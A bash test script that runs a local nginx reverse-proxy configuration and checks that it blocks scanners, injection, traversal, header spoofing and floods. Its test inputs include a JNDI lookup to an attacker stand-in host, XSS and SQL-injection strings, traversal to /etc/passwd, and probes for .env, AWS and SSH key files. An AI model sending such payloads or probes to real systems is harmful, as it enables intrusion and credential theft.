#!/usr/bin/env bash
# Runs these configs in a throwaway local nginx and checks what gets through.
#   ./check.sh               run the assertions
#   ./check.sh replay FILE   also print "status uri" for every request URI in FILE
#                            (400/410 = refused by nginx; 200 and 429 both mean "reached Rails")
# Needs nginx, openssl and curl. Nothing here is read by nginx: conf.d only loads *.conf.
set -u
cd "$(dirname "$0")"
T=$(mktemp -d)
trap '[ -f "$T/nginx.pid" ] && kill "$(cat "$T/nginx.pid")" 2>/dev/null; rm -rf "$T"' EXIT

openssl req -x509 -newkey rsa:2048 -nodes -days 1 -subj /CN=clubhouse3.dev \
  -keyout "$T/privkey.pem" -out "$T/fullchain.pem" 2>/dev/null

# Same files, moved to unprivileged ports, with "Rails" and mailpit pointed at a local echo server.
mkdir "$T/conf"
for f in *.conf; do
  sed -E -e 's/listen (\[::\]:)?80/listen \118080/; s/listen (\[::\]:)?443/listen \118443/; s/listen (\[::\]:)?10085/listen \118085/' \
    -e "s#/etc/nginx/certs/live/clubhouse3.dev#$T#; s#/var/log/nginx/access.log#$T/access.log#" \
    -e 's/set \$web web;/set $web 127.0.0.1;/; s/:3000;/:13000;/; s/mailpit:8025/127.0.0.1:13000/' "$f" > "$T/conf/$f"
done
# 127.0.0.1 plays Cloudflare; ::1 plays a stranger who found the origin address.
perl -0pi -e 's/(geo [^{]*\{\s*default 0;)/$1\n    127.0.0.1 1;/; s/^/set_real_ip_from 127.0.0.1;\n/' "$T/conf/01-cloudflare.conf"

cat > "$T/nginx.conf" <<EOF
pid $T/nginx.pid;
error_log $T/error.log;
events {}
http {
    access_log off;
    include $T/conf/*.conf;
    server {  # stands in for Rails and echoes what the proxy handed it
        listen 127.0.0.1:13000;
        access_log off;
        location / { return 200 "host=\$http_host xfh=\$http_x_forwarded_host fwd=\$http_forwarded xff=\$http_x_forwarded_for cip=\$http_client_ip upg=\$http_upgrade conn=\$http_connection\n"; }
    }
}
EOF
nginx -t -e "$T/error.log" -c "$T/nginx.conf" 2>"$T/test.log" || { cat "$T/test.log"; exit 1; }
nginx -e "$T/error.log" -c "$T/nginx.conf" && sleep 1

UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/140.0 Safari/537.36"
B=https://clubhouse3.dev:18443
fails=0
req() { curl -skg --path-as-is --max-time 5 -A "$UA" --resolve clubhouse3.dev:18443:127.0.0.1 --resolve clubhouse3.dev:18080:127.0.0.1 "$@"; }
code() { req -o /dev/null -w '%{http_code}' "$@" 2>/dev/null; }
expect() {  # expect STATUS curl-args...   STATUS may be an alternation: "410|421"
  local want=$1; shift
  local got; got=$(code "$@")
  [[ $got =~ ^($want)$ ]] || { echo "FAIL want $want got $got: $*"; fails=$((fails + 1)); }
}

# --- the app still works
for p in / /me /person/123/timesheets "/timesheets/timesheet-totals.csv?year=2026" /me/schedule.ics \
  /.well-known/openid-configuration /assets/controllers/settings_controller-0a1b2c3d.js \
  "/sso/authorize?client_id=x&redirect_uri=https%3A%2F%2Fapp.example%2Fcb%3Fnext%3D%252Fhome" \
  "/sso/authorize?client_id=x&redirect_uri=https://app.example/cb" \
  /rails/active_storage/disk/eyJfcmFpbHMiOnsicGmAwp-x.env.git--65aa2f7dd2bb/photo-4368-profile.jpg \
  /rails/active_storage/blobs/redirect/eyJfcmFpbHMi--0f0f/bmid-export.zip \
  /rails/active_storage/disk/eyJfcmFpbHMi--65aa/photo.png /assets/favicon-32-0a1b2c3d.png /robots.txt; do
  expect 200 "$B$p"
done
# OIDC discovery is fetched by RP backends, whose user agents are otherwise blocked
expect 200 -A "Go-http-client/2.0" "$B/.well-known/openid-configuration"
expect 200 -A "" "$B/.well-known/openid-configuration"
expect 400 -A "sqlmap/1.8" "$B/.well-known/openid-configuration"
expect 400 -A "Go-http-client/2.0" "$B/me"
# credential-hunting words are refused only as the first path segment
expect 200 "$B/admin/config"

# --- URL fishing
for p in /wp-admin/install.php /wp/ /wp2/ /wordpress/ /blog/wp-json/batch/v1 /wp-config.php.new //xmlrpc.php \
  /phpmyadmin/ /db/pma2020/ /adminer.php /_profiler/phpinfo /cgi-bin/luci /actuator/env /telescope/requests \
  /server-status /.env /config/.env.bak /.git/config /.aws/credentials /index.php /index.php/sign /phpinfo.php~ \
  /.env.local /.env.production /app/.env.local /.git/HEAD /.ssh/id_rsa /.docker/config.json /.well-known/acme-challenge/x \
  /credentials /credentials.csv /aws/s3/credentials /s3/credentials /env /env.js /config.js /config/stripe.js \
  /stripe.config.js /client/stripe.config.js /Dockerfile /id_rsa /backup /feed/ /RSC/R/x.txt "/?phpinfo=1" \
  /backup.sql.gz /site.zip /terraform.tfstate /config/environment.rb /login.action /trace.axd /key.pem /composer.json \
  /app.js /ads.txt /debug /debug/pprof /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php /aws-credentials \
  /index.html /me/index.html /logo.png /me/x.png /info /_next/static/x /_all_dbs /media/x /lib/x /gist/x \
  /sitemap.xml /a/feed.xml; do
  expect 400 "$B$p"
done
for p in /api/v1/config /pub/old /~bob/ /%7Ebob/; do expect 410 "$B$p"; done

# --- traversal and injection, including the three patterns the wrapped regex never matched
for p in /assets/../config/master.key /a/b/..%2f..%2fconfig/master.key /a/%2e%2e/config/master.key '/a/..%5c..%5cwin.ini' \
  '/a/..\..\win.ini' /%252e%252e%252fetc/passwd "/?f=photo%00.jpg" "/?file=../../etc/passwd" "/?u=php://input" \
  '/?x=${jndi:ldap://evil.example/a}' "/?q=<script>alert(1)</script>" "/?q=%3Cscript%3E" \
  "/?id=1+union+select+1,2" "/?id=1%20UNION%20ALL%20SELECT%201" "/?x=eval%28base64_decode%28"; do
  expect 400 "$B$p"
done

# nginx itself answers 400 to a path that climbs above the root or decodes to a NUL
for p in /assets/../../etc/passwd /%2e%2e/%2e%2e/etc/passwd /photo%00.jpg; do expect 400 "$B$p"; done

# --- HTTP protocol
expect 400 -X PROPFIND "$B/"
expect 405 -X TRACE "$B/"
expect 400 -A "curl/8.7.1" "$B/"
expect 400 -A "sqlmap/1.8" "$B/"
expect 400 -A "" "$B/"
expect "410|421" -H "Host: evil.example" "$B/"                                    # right SNI, wrong Host (421 on newer nginx)
expect 000 --resolve other.example:18443:127.0.0.1 https://other.example:18443/   # unknown SNI: handshake refused
expect 400 --resolve "clubhouse3.dev:18443:[::1]" "$B/"                           # did not come through Cloudflare
expect 410 http://127.0.0.1:18080/
expect 301 http://clubhouse3.dev:18080/me

# --- nothing the client says about itself reaches Rails
spoof=(-H "CF-Connecting-IP: 203.0.113.7" -H "Forwarded: host=evil.example" -H "X-Forwarded-Host: evil.example"
  -H "X-Forwarded-For: 6.6.6.6" -H "Client-IP: 6.6.6.6")
got=$(req "${spoof[@]}" "$B/me")
want="host=clubhouse3.dev xfh=clubhouse3.dev fwd= xff=203.0.113.7 cip= upg= conn=close"
[ "$got" = "$want" ] || { echo "FAIL proxy headers: $got"; fails=$((fails + 1)); }

# --- WebSockets (Action Cable): /cable passes the upgrade on, with the same proxy headers; / never does.
# --http1.1 because a WebSocket opens over HTTP/1.1; on h2 curl drops Upgrade and Connection itself.
ws=(--http1.1 -H "Upgrade: websocket" -H "Connection: Upgrade")
got=$(req "${ws[@]}" "${spoof[@]}" "$B/cable")
want="host=clubhouse3.dev xfh=clubhouse3.dev fwd= xff=203.0.113.7 cip= upg=websocket conn=upgrade"
[ "$got" = "$want" ] || { echo "FAIL /cable upgrade: $got"; fails=$((fails + 1)); }
got=$(req "${ws[@]}" "$B/me")
[[ $got == *" upg= conn=close" ]] || { echo "FAIL / passed an upgrade on: $got"; fails=$((fails + 1)); }

if [ "${1:-}" = replay ]; then
  while IFS= read -r uri; do printf '%s %s\n' "$(code "$B$uri")" "$uri"; done < "$2"
fi

# --- flood: burst is 40, so 80 at once must trip the limit (last: it drains the bucket)
urls=(); for _ in $(seq 80); do urls+=("$B/me"); done
req -o /dev/null -w '%{http_code}\n' "${urls[@]}" 2>/dev/null | grep -q 429 || { echo "FAIL rate limit never returned 429"; fails=$((fails + 1)); }

[ "$fails" = 0 ] && echo "all checks passed" || { echo "$fails failed"; exit 1; }
